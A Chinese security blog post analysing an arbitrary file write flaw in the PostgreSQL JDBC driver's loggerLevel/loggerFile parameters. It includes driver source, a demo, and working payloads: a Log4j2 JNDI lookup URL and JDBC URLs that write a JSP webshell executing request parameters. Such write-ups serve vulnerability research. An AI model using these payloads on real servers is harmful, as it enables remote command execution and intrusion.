@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="尽量多放代码块不放图片吧，感觉上篇放图片太多了加载有点慢">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PostgreSQL JDBC 任意文件写入漏洞">
+<meta property="og:url" content="https://wanth3f1ag.top/2026/02/27/Java%E4%B9%8BPostgreSQL%20JDBC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="尽量多放代码块不放图片吧，感觉上篇放图片太多了加载有点慢">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227131758663.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227133808427.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227135034247.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/1748832412656.png">
+<meta property="article:published_time" content="2026-02-27T05:08:50.000Z">
+<meta property="article:modified_time" content="2026-02-27T05:53:37.633Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="javasec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/java--ctfshow/image-20260227131758663.png">
+
+
+<link rel="canonical" href="https://wanth3f1ag.top/2026/02/27/Java%E4%B9%8BPostgreSQL%20JDBC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2026/02/27/Java%E4%B9%8BPostgreSQL%20JDBC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/","path":"2026/02/27/Java之PostgreSQL JDBC 任意文件写入漏洞/","title":"PostgreSQL JDBC 任意文件写入漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PostgreSQL JDBC 任意文件写入漏洞 | root@wanth3f1ag</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#demo%E6%B5%8B%E8%AF%95"><span class="nav-number">4.</span> <span class="nav-text">demo测试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">5.</span> <span class="nav-text">利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E5%90%88Log4j2"><span class="nav-number">5.1.</span> <span class="nav-text">结合Log4j2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSP-webshell"><span class="nav-number">5.2.</span> <span class="nav-text">JSP_webshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">6.</span> <span class="nav-text">漏洞修复</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wanTh3flag"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wanTh3flag</p>
+  <div class="site-description" itemprop="description">一条有梦想的咸鱼</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">186</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">121</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="/2323277194" title="qq → 2323277194" rel="noopener me"><i class="fab fa-qq fa-fw"></i>qq</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wanth3f1ag.top/2026/02/27/Java%E4%B9%8BPostgreSQL%20JDBC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="wanTh3flag">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="root@wanth3f1ag">
+      <meta itemprop="description" content="一条有梦想的咸鱼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PostgreSQL JDBC 任意文件写入漏洞 | root@wanth3f1ag">
+      <meta itemprop="description" content="尽量多放代码块不放图片吧，感觉上篇放图片太多了加载有点慢">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PostgreSQL JDBC 任意文件写入漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-02-27 13:08:50 / 修改时间：13:53:37" itemprop="dateCreated datePublished" datetime="2026-02-27T13:08:50+08:00">2026-02-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/javasec/" itemprop="url" rel="index"><span itemprop="name">javasec</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">尽量多放代码块不放图片吧，感觉上篇放图片太多了加载有点慢</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>当攻击者可以控制 JDBC Url 时，可以通过 loggerLevel&#x2F;loggerFile 参数来指定日志记录的等级以及日志记录的位置，因此可以写入 JSP 文件，可能导致 RCE。</p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><ul>
+<li>42.3.x &lt; 42.3.3</li>
+<li>42.1.x</li>
+</ul>
+<h1 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h1><p>在pom.xml中导入对应的PostgreSQL依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞代码在jdbc初始化的时候，也就是org.postgresql.Driver#connect方法执行完parseURL解析了url之后会调用 <code>org.postgresql.Driver#setupLoggerFromProperties</code> 方法</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227131758663.png" alt="image-20260227131758663"></p>
+<p>跟进该方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setupLoggerFromProperties</span><span class="params">(<span class="keyword">final</span> Properties props)</span> &#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="type">String</span> <span class="variable">driverLogLevel</span> <span class="operator">=</span> PGProperty.LOGGER_LEVEL.get(props);</span><br><span class="line">  <span class="keyword">if</span> (driverLogLevel == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">// Don&#x27;t mess with Logger if not set</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">&quot;OFF&quot;</span>.equalsIgnoreCase(driverLogLevel)) &#123;</span><br><span class="line">    PARENT_LOGGER.setLevel(Level.OFF);</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">// Don&#x27;t mess with Logger if set to OFF</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;DEBUG&quot;</span>.equalsIgnoreCase(driverLogLevel)) &#123;</span><br><span class="line">    PARENT_LOGGER.setLevel(Level.FINE);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;TRACE&quot;</span>.equalsIgnoreCase(driverLogLevel)) &#123;</span><br><span class="line">    PARENT_LOGGER.setLevel(Level.FINEST);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">ExpressionProperties</span> <span class="variable">exprProps</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionProperties</span>(props, System.getProperties());</span><br><span class="line">  <span class="keyword">final</span> <span class="type">String</span> <span class="variable">driverLogFile</span> <span class="operator">=</span> PGProperty.LOGGER_FILE.get(exprProps);</span><br><span class="line">  <span class="keyword">if</span> (driverLogFile != <span class="literal">null</span> &amp;&amp; driverLogFile.equals(loggerHandlerFile)) &#123;</span><br><span class="line">    <span class="keyword">return</span>; <span class="comment">// Same file output, do nothing.</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (java.util.logging.Handler handlers : PARENT_LOGGER.getHandlers()) &#123;</span><br><span class="line">    <span class="comment">// Remove previously set Handlers</span></span><br><span class="line">    handlers.close();</span><br><span class="line">    PARENT_LOGGER.removeHandler(handlers);</span><br><span class="line">    loggerHandlerFile = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  java.util.logging.<span class="type">Handler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">if</span> (driverLogFile != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      handler = <span class="keyword">new</span> <span class="title class_">java</span>.util.logging.FileHandler(driverLogFile);</span><br><span class="line">      loggerHandlerFile = driverLogFile;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">      System.err.println(<span class="string">&quot;Cannot enable FileHandler, fallback to ConsoleHandler.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">Formatter</span> <span class="variable">formatter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleFormatter</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( handler == <span class="literal">null</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (DriverManager.getLogWriter() != <span class="literal">null</span>) &#123;</span><br><span class="line">      handler = <span class="keyword">new</span> <span class="title class_">LogWriterHandler</span>(DriverManager.getLogWriter());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( DriverManager.getLogStream() != <span class="literal">null</span>) &#123;</span><br><span class="line">      handler = <span class="keyword">new</span> <span class="title class_">StreamHandler</span>(DriverManager.getLogStream(), formatter);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      handler = <span class="keyword">new</span> <span class="title class_">ConsoleHandler</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    handler.setFormatter(formatter);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">Level</span> <span class="variable">loggerLevel</span> <span class="operator">=</span> PARENT_LOGGER.getLevel();</span><br><span class="line">  <span class="keyword">if</span> (loggerLevel != <span class="literal">null</span>) &#123;</span><br><span class="line">    handler.setLevel(loggerLevel);</span><br><span class="line">  &#125;</span><br><span class="line">  PARENT_LOGGER.setUseParentHandlers(<span class="literal">false</span>);</span><br><span class="line">  PARENT_LOGGER.addHandler(handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据我们的JDBC连接参数去动态配置一个日志记录功能，首先配置loggerLevel日志的等级和loggerFile日志的文件位置，并且会创建新的FileHandler删除旧的Handler避免重复，从这里可以看出如果我们设置了loggerLevel和loggerFile两个参数，就会另外使用新配置的文件进行记录日志</p>
+<p>跳出setupLoggerFromProperties方法，然后有一个 <code>LOGGER.log(Level.FINE, &quot;Connecting with URL: &#123;0&#125;&quot;, url);</code>的操作，这里直接调用<code>java.util.logging#Logger.log</code>方法将URL写入了日志，这里对应的级别是FINE，其实也就是DEBUG</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">log</span><span class="params">(Level level, String msg, Object param1)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!isLoggable(level)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">LogRecord</span> <span class="variable">lr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LogRecord</span>(level, msg);</span><br><span class="line">    Object params[] = &#123; param1 &#125;;</span><br><span class="line">    lr.setParameters(params);</span><br><span class="line">    doLog(lr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>写个demo测试一下就知道了</p>
+<h1 id="demo测试"><a href="#demo测试" class="headerlink" title="demo测试"></a>demo测试</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> PostgreSQLJDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">pgSQL_write_vuln</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerLevel</span> <span class="operator">=</span> <span class="string">&quot;DEBUG&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerFile</span> <span class="operator">=</span> <span class="string">&quot;E:\\java\\JavaSec\\JDBCSerialize\\src\\main\\java\\test.jsp&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">shellContent</span> <span class="operator">=</span> <span class="string">&quot;&lt;%25Test%25&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">dbUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql:///?loggerLevel=&quot;</span>+loggerLevel+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+<span class="string">&quot;&amp;&quot;</span>+shellContent;</span><br><span class="line">        System.out.println(dbUrl);</span><br><span class="line">        DriverManager.getConnection(dbUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227133808427.png" alt="image-20260227133808427"></p>
+<p>可以看到确实是成功写入了的</p>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="结合Log4j2"><a href="#结合Log4j2" class="headerlink" title="结合Log4j2"></a>结合Log4j2</h2><p>说到日志，就不得不想到Log4j2这个组件，既然是记录日志，则有可能配合 log4j2 实现 JNDI 注入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">///$&#123;jndi:ldap://127.0.0.1:1389/exp&#125;?loggerLevel=TRACE&amp;loggerFile=log.log</span></span><br></pre></td></tr></table></figure>
+
+<p>能写文件，不过还要出网</p>
+<h2 id="JSP-webshell"><a href="#JSP-webshell" class="headerlink" title="JSP_webshell"></a>JSP_webshell</h2><p>最经典的 webshell 写入，也是前面分析过的，但需要注意一个URL解码的解析问题</p>
+<p>由于会在部分位置进行 url 解码，因此要避开 <code>&lt;% %&gt;</code> 被 urldecode 报错的问题。例如</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">///?loggerLevel=DEBUG&amp;loggerFile=/tmp/a1.jsp&amp;&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者直接写在前面：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">//&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;/?loggerLevel=DEBUG&amp;loggerFile=/tmp/a2.jsp</span></span><br></pre></td></tr></table></figure>
+
+<p>具体的原因直接参考师傅的文章：<a target="_blank" rel="noopener" href="https://su18.org/post/postgresql-jdbc-attack-and-stuff/#4-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">https://su18.org/post/postgresql-jdbc-attack-and-stuff/#4-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F</a></p>
+<p>当然也可以用EL表达式，pyn3rd 师傅在他的文章中给出他的这种利用思路</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:<span class="comment">//127.0.0.1:5432/testdb?ApplicationName=$&#123;Runtime.getRuntime().exec(&quot;open -a calculator&quot;)&#125;&amp;loggerLevel=TRACE&amp;loggerFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/calc.jsp</span></span><br></pre></td></tr></table></figure>
+
+<p>更进阶的一个写法是来自 whwlsfb 大哥的分享</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql:$&#123;<span class="string">&quot;&quot;</span>[param.a]()[param.b](param.c)[param.d]()[param.e](param.f)[param.g](param.h)&#125;?loggerLevel=TRACE&amp;loggerFile=/tomcat/.../a.jsp</span><br></pre></td></tr></table></figure>
+
+<p>然后可以传入参数进行动态类方法的加载调用</p>
+<p><img src="/../image/achieve/202411/java--ctfshow/image-20260227135034247.png" alt="image-20260227135034247"></p>
